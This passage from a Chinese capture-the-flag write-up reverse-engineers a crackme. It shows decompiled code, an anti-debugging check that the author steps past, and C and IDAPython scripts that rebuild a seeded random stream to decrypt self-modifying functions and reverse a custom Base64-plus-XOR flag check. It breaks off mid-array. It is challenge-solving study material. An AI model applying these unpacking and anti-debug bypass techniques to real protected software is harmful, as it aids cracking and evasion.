[esp-BCh] [ebp-C8h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp-B8h] [ebp-C4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp-B4h] [ebp-C0h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp-B0h] [ebp-BCh]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [esp-ACh] [ebp-B8h]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp-A8h] [ebp-B4h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [esp-A4h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp-A0h] [ebp-ACh]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp-9Ch] [ebp-A8h]</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [esp-98h] [ebp-A4h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [esp-94h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [esp-90h] [ebp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [esp-8Ch] [ebp-98h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [esp-88h] [ebp-94h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp-84h] [ebp-90h]</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [esp-80h] [ebp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [esp-7Ch] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [esp-78h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [esp-74h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [esp-70h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// [esp-6Ch] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// [esp-68h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// [esp-64h] [ebp-70h]</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// [esp-60h] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// [esp-5Ch] [ebp-68h]</span></span><br><span class="line">  <span class="type">int</span> v44; <span class="comment">// [esp-58h] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// [esp-54h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// [esp-50h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v47; <span class="comment">// [esp-4Ch] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v48; <span class="comment">// [esp-48h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// [esp-44h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// [esp-40h] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// [esp-3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// [esp-38h] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v53; <span class="comment">// [esp-34h] [ebp-40h]</span></span><br><span class="line">  __int128 v54; <span class="comment">// [esp-30h] [ebp-3Ch]</span></span><br><span class="line">  __int64 v55; <span class="comment">// [esp-20h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// [esp-18h] [ebp-24h]</span></span><br><span class="line">  __int16 v57; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v58; <span class="comment">// [esp-4h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v59; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v60; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> retaddr; <span class="comment">// [esp+Ch] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v59 = a1;</span><br><span class="line">  v60 = retaddr;</span><br><span class="line">  v58 = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v59 ^ __security_cookie;</span><br><span class="line">  v15 = a3;</span><br><span class="line">  CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  sub_401020(<span class="string">&quot;%s\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !dword_40737C )</span><br><span class="line">  &#123;</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_401020(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401020(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *((_BYTE *)&amp;loc_4015E0 + v3++) ^= byte_417000[rand() % <span class="number">8216</span>];</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">383</span> );</span><br><span class="line">  sub_401020(<span class="string">&quot;Shining!\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v54 = <span class="number">0</span>i64;</span><br><span class="line">  v55 = <span class="number">0</span>i64;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v36, <span class="number">0</span>, <span class="number">0x46</span>u);</span><br><span class="line">  sub_401020(<span class="string">&quot;My Darling Darling Please!\ninput your key!\n&quot;</span>);</span><br><span class="line">  sub_401050(<span class="string">&quot;%29s&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v54);</span><br><span class="line">  ((<span class="type">void</span> (__stdcall *)(__int128 *, <span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, _DWORD))loc_4015E0)(</span><br><span class="line">    &amp;v54,</span><br><span class="line">    &amp;v36,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v8,</span><br><span class="line">    v9,</span><br><span class="line">    v10,</span><br><span class="line">    v11,</span><br><span class="line">    a2,</span><br><span class="line">    v15,</span><br><span class="line">    v16,</span><br><span class="line">    v17,</span><br><span class="line">    v18,</span><br><span class="line">    v19,</span><br><span class="line">    v20,</span><br><span class="line">    v21,</span><br><span class="line">    v22,</span><br><span class="line">    v23,</span><br><span class="line">    v24,</span><br><span class="line">    v25,</span><br><span class="line">    v26,</span><br><span class="line">    v27,</span><br><span class="line">    v28,</span><br><span class="line">    v29,</span><br><span class="line">    v30,</span><br><span class="line">    v31,</span><br><span class="line">    v32,</span><br><span class="line">    v33,</span><br><span class="line">    v34,</span><br><span class="line">    v35,</span><br><span class="line">    v36,</span><br><span class="line">    v37,</span><br><span class="line">    v38,</span><br><span class="line">    v39,</span><br><span class="line">    v40,</span><br><span class="line">    v41,</span><br><span class="line">    v42,</span><br><span class="line">    v43,</span><br><span class="line">    v44,</span><br><span class="line">    v45,</span><br><span class="line">    v46,</span><br><span class="line">    v47,</span><br><span class="line">    v48,</span><br><span class="line">    v49,</span><br><span class="line">    v50,</span><br><span class="line">    v51,</span><br><span class="line">    v52,</span><br><span class="line">    v53,</span><br><span class="line">    v54);</span><br><span class="line">  *(_OWORD *)&amp;v18 = xmmword_403520;</span><br><span class="line">  *(_OWORD *)&amp;v22 = xmmword_403530;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  LOWORD(v35) = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)&amp;v26 = <span class="number">0</span>i64;</span><br><span class="line">  *(_OWORD *)&amp;v30 = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v36, (<span class="type">const</span> <span class="type">char</span> *)&amp;v18);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    v12 = -(v12 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="string">&quot;Maybe next year&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    v13 = <span class="string">&quot;Nice Job~&quot;</span>;</span><br><span class="line">  sub_401020(v13);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其他位置还比较好看，但是中间有一个函数不正常，这就是第二个要解密的函数，观察解密算法，和第一个函数的算法一样，但是如果你尝试使用第一个脚本解密的话，是不能正常解出来的。<br>猜想原因就是随机数种子不再是 0x61616161 了，在程序运行中 srand 进行了更换。  </p>
<p>下一步就是找到哪里更换了随机数种子，继续调试，单步到 start 函数(或者参考 IDA 的地址直接下断点)，分析 start 函数，抛开前面的初始化流程不看，在第 <strong>44</strong> 行发现了一个异常函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__usercall sub_402510@&lt;eax&gt;(<span class="type">signed</span> <span class="type">int</span> a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// [esp-8h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// [esp-4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  (*(a1 - <span class="number">20</span>))(<span class="number">-1</span>, &amp;v4);</span><br><span class="line">  v1 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    v5 = <span class="number">268439909</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="string">&#x27;hctf&#x27;</span>;</span><br><span class="line">  v2 = v1 - <span class="number">17044</span>;</span><br><span class="line">  (*(v1 - <span class="number">17044</span>))(v5);</span><br><span class="line">  (*(v2 - <span class="number">4</span>))();</span><br><span class="line">  <span class="keyword">return</span> &amp;unk_407384;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>“hctf” 四个大字摆在这里，这个函数应该比较重要。<br>不巧的是函数里调用了 3 个虚函数，静态没办法确定它们是什么，于是使用 OD 进行动态调试，在这个函数下断点，直接运行就可以断在这里：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar3.png"
                      alt="image"
                ></p>
<p>单步就可以确定三个函数是什么了，第一个是反调试，调用了 checkremotedebuggerpresent 进行检测，这个可以不管他，直接步过就好，下面两个函数分别是 srand 和 rand，很明显了，就是在这里将随机数种子换掉了，那换成什么了呢？动态调试发现被换成了 0x10001165 ，但是如果拿这个种子生成随机数去解密第二个函数的话，解出来的都是错误代码，说明随机数种子不应该是它，那么猜想应该是 0x68637466 ，即 “hctf”，经验证是正确的。<br>再次编写两个小程序去解密函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(<span class="number">0x68637466</span>);</span><br><span class="line">    <span class="type">int</span> token[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        token[i] = rand() % <span class="number">0x2018</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>,token[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">0x417000</span></span><br><span class="line">b = a + <span class="number">8327168</span></span><br><span class="line">select = []</span><br><span class="line"><span class="keyword">while</span> a &lt;=b :</span><br><span class="line">    select.append(Byte(a))</span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line">token2 = [*]</span><br><span class="line">v11 = <span class="number">0x4015e0</span></span><br><span class="line">v12 = <span class="number">383</span></span><br><span class="line">tt = <span class="number">1</span>    <span class="comment"># 注意这个是 1 ！！！</span></span><br><span class="line"><span class="keyword">while</span> v12 &gt; <span class="number">0</span>:</span><br><span class="line">    v11 = v11 + <span class="number">1</span></span><br><span class="line">    PatchByte(v11 - <span class="number">1</span>, Byte(v11 - <span class="number">1</span>) ^ select[token2[tt]])</span><br><span class="line">    tt += <span class="number">1</span></span><br><span class="line">    v12 -= <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<p>这样就可以把第二个函数解密出来了！  </p>
<p>现在整个程序的主要逻辑已经被完全解密。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4015E0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v14; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v19; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v20; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">4</span> * v3 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v4 &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &amp; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = a1[v2 - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = a1[v2++];</span><br><span class="line">          v7 = (v9 &gt;&gt; <span class="number">4</span>) | <span class="number">16</span> * (v8 &amp; <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = a1[v2++];</span><br><span class="line">          v7 = (v10 &gt;&gt; <span class="number">6</span>) | <span class="number">4</span> * (v8 &amp; <span class="number">0xF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v8 &amp; <span class="number">0x3F</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = &amp;a1[v2++];</span><br><span class="line">        v7 = *v6 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a2[v4++] = byte_4033C8[v7];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; v20 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">4</span> * v3 / <span class="number">3</span>;</span><br><span class="line">    v12 = <span class="number">16</span> * (a1[v2 - <span class="number">1</span>] &amp; <span class="number">3</span>);</span><br><span class="line">    *&amp;a2[v20 + <span class="number">1</span>] = <span class="number">15677</span>;</span><br><span class="line">    v13 = byte_4033C8[v12];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) % <span class="number">3</span> != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    v11 = <span class="number">4</span> * v3 / <span class="number">3</span>;</span><br><span class="line">    v13 = byte_4033C8[<span class="number">4</span> * (a1[v2 - <span class="number">1</span>] &amp; <span class="number">0xF</span>)];</span><br><span class="line">    a2[v20 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a2[v11] = v13;</span><br><span class="line">LABEL_15:</span><br><span class="line">  a2[<span class="built_in">strlen</span>(a2)] = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="keyword">if</span> ( v19 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = rand() % <span class="number">4</span>;</span><br><span class="line">        v18 = v16;</span><br><span class="line">        v16 -= <span class="number">2</span>;</span><br><span class="line">        result = v17 &lt;&lt; v18;</span><br><span class="line">        a2[v14] ^= result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v16 &gt; <span class="number">-2</span> );</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v14 &lt; v19 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对输入的 flag 做一次 BASE64 编码，注意这里的表盘被换掉了，然后取随机数对每个字节异或 4 次，循环进行，直到所有字符处理完毕。<br>算法很简单，由于异或可逆，那么现在只缺少密文了，观察第一个解密出来的函数发现，比较 flag 是否正确的代码就在其中，那么通过动态调试就能拿到密文！<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar4.png"
                      alt="image"
                ></p>
<p>将密文抽取出来，通过逆向算法可以拿到 BASE64 编码后的 flag（注意随机数的起始位置）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v14 = <span class="number">0</span></span><br><span class="line">token = [<span class="number">0x59c4</span>,<span class="number">0x124</span>,<span class="number">0xb5a</span>,<span class="number">0x29a4</span>,<span class="number">0x1e32</span>,<span class="number">0x7fb4</span>,<span class="number">0x5560</span>,<span class="number">0x7eb5</span>,<span class="number">0x78d4</span>,<span class="number">0x88f</span>,<span class="number">0x7dc6</span>,<span class="number">0x14d9</span>,<span class="number">0x7faa</span>,<span class="number">0x3288</span>,<span class="number">0x75ab</span>,<span class="number">0x3801</span>,<span class="number">0x30f1</span>,<span class="number">0x1cb8</span>,<span class="number">0x524c</span>,<span class="number">0x10c4</span>,<span class="number">0x19f4</span>,<span class="number">0x4a0c</span>,<span class="number">0x4a7a</span>,<span class="number">0x7c01</span>,<span class="number">0x6025</span>,<span class="number">0x5600</span>,<span class="number">0x284c</span>,<span class="number">0x5c6</span>,<span class="number">0x606c</span>,<span class="number">0x66a9</span>,<span class="number">0x311</span>,<span class="number">0xb70</span>,<span class="number">0x58bf</span>,<span class="number">0x7ff9</span>,<span class="number">0x5588</span>,<span class="number">0x4914</span>,<span class="number">0x4ff3</span>,<span class="number">0x1c3f</span>,<span class="number">0x4454</span>,<span class="number">0x561e</span>,<span class="number">0x2fd2</span>,<span class="number">0x2ded</span>,<span class="number">0x28aa</span>,<span class="number">0x5538</span>,<span class="number">0x456d</span>,<span class="number">0x6e9e</span>,<span class="number">0x334d</span>,<span class="number">0x5b6e</span>,<span class="number">0x1bb4</span>,<span class="number">0x1f57</span>,<span class="number">0x3bbc</span>,<span class="number">0x528f</span>,<span class="number">0x6443</span>,<span class="number">0x1e0d</span>,<span class="number">0xfa9</span>,<span class="number">0x5ad6</span>,<span class="number">0x627f</span>,<span class="number">0x7468</span>,<span class="number">0x56ae</span>,<span class="number">0x6fc9</span>,<span class="number">0xce2</span>,<span class="number">0x43c7</span>,<span class="number">0x5e3c</span>,<span class="number">0x5462</span>,<span class="number">0x5893</span>,<span class="number">0x3284</span>,<span class="number">0x61d4</span>,<span class="number">0xa6d</span>,<span class="number">0x633a</span>,<span class="number">0x3e79</span>,<span class="number">0x2379</span>,<span class="number">0x5931</span>,<span class="number">0x6f12</span>,<span class="number">0x18c3</span>,<span class="number">0x6865</span>,<span class="number">0x2752</span>,<span class="number">0x6540</span>,<span class="number">0x6ec5</span>,<span class="number">0x2dfb</span>,<span class="number">0x2bf6</span>,<span class="number">0x5263</span>,<span class="number">0x4470</span>,<span class="number">0x2afd</span>,<span class="number">0x3b27</span>,<span class="number">0x116c</span>,<span class="number">0x43c2</span>,<span class="number">0x70ff</span>,<span class="number">0x3179</span>,<span class="number">0x18b0</span>,<span class="number">0x258d</span>,<span class="number">0x421b</span>,<span class="number">0x42ec</span>,<span class="number">0x1d3b</span>,<span class="number">0x177a</span>,<span class="number">0x6ee7</span>,<span class="number">0x3113</span>,<span class="number">0x67</span>,<span class="number">0x434d</span>,<span class="number">0x50a4</span>,<span class="number">0x2c76</span>,<span class="number">0x3bae</span>,<span class="number">0x5b6b</span>,<span class="number">0x33b8</span>,<span class="number">0x6536</span>,<span class="number">0x3ebd</span>,<span class="number">0x5099</span>,<span class="number">0x465f</span>,<span class="number">0xeef</span>,<span class="number">0x73c9</span>,<span class="number">0x1506</span>,<span class="number">0x5f9d</span>,<span class="number">0x5be2</span>,<span class="number">0x5e26</span>,<span class="number">0x108c</span>,<span class="number">0x3277</span>,<span class="number">0x3354</span>,<span class="number">0x716</span>,<span class="number">0x2a33</span>,<span class="number">0x4162</span>,<span class="number">0x2731</span>,<span class="number">0x2cdf</span>,<span class="number">0xaf7</span>,<span class="number">0x25fc</span>,<span class="number">0x6cf5</span>,<span class="number">0x6820</span>,<span class="number">0x7dcb</span>,<span class="number">0xfa</span>,<span class="number">0x5dcc</span>,<span class="number">0x3b64</span>,<span class="number">0x10dd</span>,<span class="number">0x2661</span>,<span class="number">0x41f8</span>,<span class="number">0x40f8</span>,<span class="number">0x5c1c</span>,<span class="number">0x59fa</span>,<span class="number">0x6b74</span>,<span class="number">0x6afa</span>,<span class="number">0x10f8</span>,<span class="number">0x2fff</span>,<span class="number">0x63d7</span>,<span class="number">0x9b3</span>,<span class="number">0x3768</span>,<span class="number">0x661b</span>,<span class="number">0x317a</span>,<span class="number">0xc27</span>,<span class="number">0x3c32</span>,<span class="number">0x4892</span>,<span class="number">0x77dd</span>,<span class="number">0x2ee9</span>,<span class="number">0x3467</span>,<span class="number">0x77bb</span>,<span class="number">0x7747</span>,<span class="number">0xd34</span>,<span class="number">0x7a2c</span>,<span class="number">0x21b7</span>,<span class="number">0x2fad</span>,<span class="number">0x4838</span>,<span class="number">0x6c0</span>,<span class="number">0x45d</span>,<span class="number">0x2ad5</span>,<span class="number">0x38b2</span>,<span class="number">0x2dbb</span>,<span class="number">0x4b74</span>,<span class="number">0x31bc</span>,<span class="number">0x5ebf</span>,<span class="number">0x1d94</span>,<span class="number">0x1f25</span>,<span class="number">0x7134</span>,<span class="number">0x3f2</span>,<span class="number">0x4966</span>,<span class="number">0x76af</span>,<span class="number">0x51d1</span>,<span class="number">0x43a4</span>,<span class="number">0x1ff4</span>,<span class="number">0x35d</span>,<span class="number">0x706</span>,<span class="number">0x6d8b</span>,<span class="number">0x33ea</span>,<span class="number">0x47b6</span>,<span class="number">0x198c</span>,<span class="number">0x768f</span>,<span class="number">0x3966</span>,<span class="number">0x2ef3</span>,<span class="number">0x7103</span>,<span class="number">0x6bd8</span>,<span class="number">0x7cb6</span>,<span class="number">0x38b6</span>,<span class="number">0x20dc</span>,<span class="number">0x1c2c</span>,<span class="number">0x3664</span>,<span class="number">0xcf8</span>,<span class="number">0x7c76</span>,<span class="number">0x6b78</span>,<span class="number">0x606f</span>,<span class="number">0xc43</span>,<span class="number">0x3687</span>,<span class="number">0x4ac</span>,<span class="number">0x70dc</span>,<span class="number">0x3022</span>,<span class="number">0xfbe</span>,<span class="number">0x5dcc</span>,<span class="number">0x1d6d</span>,<span class="number">0x4fd7</span>,<span class="number">0x58a7</span>,<span class="number">0x4244</span>,<span class="number">0xcb1</span>,<span class="number">0x1d4b</span>,<span class="number">0x4ace</span>,<span class="number">0x577d</span>,<span class="number">0x183d</span>,<span class="number">0x6e4b</span>,<span class="number">0x7d27</span>,<span class="number">0x4fad</span>,<span class="number">0x438</span>,<span class="number">0x25f0</span>,<span class="number">0x77ad</span>,<span class="number">0x3ef3</span>,<span class="number">0x501d</span>,<span class="number">0x525f</span>,<span class="number">0x2a4a</span>,<span class="number">0x46a3</span>,<span class="number">0x4bc</span>,<span class="number">0x52b3</span>,<span class="number">0x4af7</span>,<span class="number">0xadf</span>,<span class="number">0x2382</span>,<span class="number">0x1938</span>,<span class="number">0x5f24</span>,<span class="number">0x2667</span>,<span class="number">0x1afb</span>,<span class="number">0x5dda</span>,<span class="number">0x745a</span>,<span class="number">0x10b1</span>,<span class="number">0x6495</span>,<span class="number">0x54dd</span>,<span class="number">0x4c1f</span>,<span class="number">0x2a3d</span>,<span class="number">0x2fa7</span>,<span class="number">0x3dce</span>,<span class="number">0x7f1a</span>,<span class="number">0x6323</span>,<span class="number">0x3db1</span>,<span class="number">0x5eb9</span>,<span class="number">0x5b77</span>,<span class="number">0x2fee</span>,<span class="number">0x53e6</span>,<span class="number">0x3f9c</span>,<span class="number">0x28d</span>,<span class="number">0x40ac</span>,<span class="number">0x65e7</span>,<span class="number">0x3a1c</span>,<span class="number">0x9be</span>,<span class="number">0x2e46</span>,<span class="number">0x5dd2</span>,<span class="number">0x3177</span>,<span class="number">0x229f</span>,<span class="number">0x120e</span>,<span class="number">0x257b</span>,<span class="number">0x6ba</span>,<span class="number">0xe59</span>,<span class="number">0x3b97</span>,<span class="number">0x54f9</span>,<span class="number">0x1d34</span>,<span class="number">0x6050</span>,<span class="number">0x78c9</span>,<span class="number">0x2a65</span>,<span class="number">0x32a</span>,<span class="number">0x5402</span>,<span class="number">0x2434</span>,<span class="number">0x2ede</span>,<span 